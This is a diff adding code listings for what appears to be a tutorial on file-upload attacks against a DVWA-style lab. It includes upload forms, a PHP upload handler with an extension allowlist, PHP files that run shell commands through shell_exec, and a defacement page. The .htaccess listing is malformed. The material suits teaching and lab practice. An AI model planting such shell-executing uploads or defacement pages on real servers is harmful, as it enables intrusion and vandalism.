@@ -1,0 +1,137 @@
+//code 6.1
+<div class="vulnerable_code_area">
+
+ <form enctype="multipart/form-data" action="#" method="POST" />
+ <input type="hidden" name="MAX_FILE_SIZE" value="100000" />
+ Choose an image to upload:
+ <br />
+ <input name="uploaded" type="file" /><br />
+ <br />
+ <input type="submit" name="Upload" value="Upload" />
+ </form>
+</div>
+
+--------------------
+
+//code 6.2
+//index.php
+  <form method="POST" action="upload.php" enctype="multipart/form-data">
+    <div>
+      <span>Upload a File:</span>
+      <input type="file" name="uploadedFile" />
+    </div>
+    <input type="submit" name="uploadBtn" value="Upload" />
+</form>
+
+----------------------
+
+//code 6.3
+//upload.php
+if (isset($_FILES['uploadedFile']) && $_FILES['uploadedFile']['error'] === UPLOAD_ERR_OK)
+  {
+    $fileTmpPath = $_FILES['uploadedFile']['tmp_name'];
+    $fileName = $_FILES['uploadedFile']['name'];
+    $fileSize = $_FILES['uploadedFile']['size'];
+    $fileType = $_FILES['uploadedFile']['type'];
+    $fileNameCmps = explode(".", $fileName);
+    $fileExtension = strtolower(end($fileNameCmps));
+    // sanitizing file-name
+    $newFileName = md5(time() . $fileName) . '.' . $fileExtension;
+    // checking if file has one of the following extensions
+    $allowedfileExtensions = array('jpg', 'jpeg', 'gif', 'png');
+    if (in_array($fileExtension, $allowedfileExtensions))
+    {
+      // directory in which the uploaded file will be moved
+      $uploadFileDir = './uploaded_files/';
+      $dest_path = $uploadFileDir . $newFileName;
+      if(move_uploaded_file($fileTmpPath, $dest_path)) 
+      {
+        echo 'File is successfully uploaded.';
+      }
+      else 
+      {
+        echo 'There was some error moving the file to upload directory. Please make sure the upload directory is writable by web server.';
+      }
+    }
+    else
+    {
+     echo 'Upload failed. Allowed file types: ' . implode(',', $allowedfileExtensions);
+    }
+
+
+---------------------------
+
+// code 6.4
+<?php
+$output1 = shell_exec('ls -la');
+$output2 = shell_exec('mkdir hacker');
+$output3 = shell_exec('cal');
+$output4 = shell_exec('pwd');
+
+
+echo "<pre>$output1</pre>";
+echo"<hr>";
+echo "<pre>$output2</pre>";
+echo 'directory hacker created successfully';
+echo"<hr>";
+echo "<pre>$output3</pre>";
+echo"<hr>";
+echo "<pre>$output4</pre>";
+?>
+
+
+---------------------------
+
+//code 6.5
+//.htaccess
+    deny from all <
+    files ~ "^w+.(gif|jpe?g|png)$"> 
+    order deny,allow
+    allow from all 
+    </files>
+
+
+------------------------------
+
+//code 6.6
+<?php
+$output1 = shell_exec('ls -la');
+$output2 = shell_exec('mkdir hacker');
+
+echo "<pre>$output1</pre>";
+echo"<hr>";
+echo "<pre>$output2</pre>";
+echo 'directory hacker created successfully';
+echo"<hr>";
+?>
+
+-------------------------
+
+//code 6.7
+<?php
+
+echo "<h1>This site is hacked!</h1>";
+
+
+------------------------
+
+//code 6.8
+<div class="vulnerable_code_area">
+
+		<form enctype="multipart/form-data" action="#" method="POST" />
+			<input type="hidden" name="MAX_FILE_SIZE" value="100000" />
+			Choose an image to upload:
+			<br />
+			<input name="uploaded" type="file" /><br />
+			<br />
+			<input type="submit" name="Upload" value="Upload" />
+		</form>
+
+		<pre>../../hackable/uploads/x.php succesfully uploaded!</pre>
+
+	</div>
+
+
+----------------------------
+
+
